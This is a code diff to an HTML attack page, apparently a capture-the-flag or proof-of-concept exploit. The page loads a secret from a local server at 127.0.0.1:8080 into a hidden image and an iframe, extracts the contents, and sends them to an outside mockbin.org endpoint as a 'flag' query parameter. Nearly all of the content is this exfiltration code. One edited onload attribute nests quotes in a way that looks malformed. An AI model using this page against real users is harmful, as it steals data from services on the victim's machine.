@@ -27,9 +27,9 @@ function getBase64Image(img) {
 
     return dataURL.replace(/^data:image\/(png|jpg);base64,/, "");
 }
-function sendrequ(){
+function sendrequ(payload){
   	var img = document.createElement('img');
-	img.src = "http://mockbin.org/bin/21c6f9aa-c551-4717-bc2c-b63516eb13ab?flag=" + getBase64Image(document.getElementById("ttt"));
+	img.src = "http://mockbin.org/bin/21c6f9aa-c551-4717-bc2c-b63516eb13ab?flag=" + payload;
 	document.body.appendChild(img);
 }   
 
@@ -44,7 +44,7 @@ function getFrameContents(){
    { // IE
      iFrameBody = iFrame.contentWindow.document.getElementsByTagName('body')[0];
    }
-    alert(iFrameBody.innerHTML);
+    return iFrameBody.innerHTML;
  }
     /*
     	var xmlHttp = new XMLHttpRequest();
@@ -63,8 +63,8 @@ function getFrameContents(){
 	}
 	*/
     </script>
-    <img id="ttt" src="http://127.0.0.1:8080/secret" style="width:1px;height:1px;" onload="sendrequ()">
-    <iframe id="testf" src="http://127.0.0.1:8080/secret" onload="getFrameContents()"></iframe>
+    <img id="ttt" src="http://127.0.0.1:8080/secret.html" style="width:1px;height:1px;" onload="sendrequ(getBase64Image(document.getElementById("ttt")))">
+    <iframe id="testf" src="http://127.0.0.1:8080/secret.html" onload="sendrequ(getFrameContents())"></iframe>
   </body>
 </html> 
  
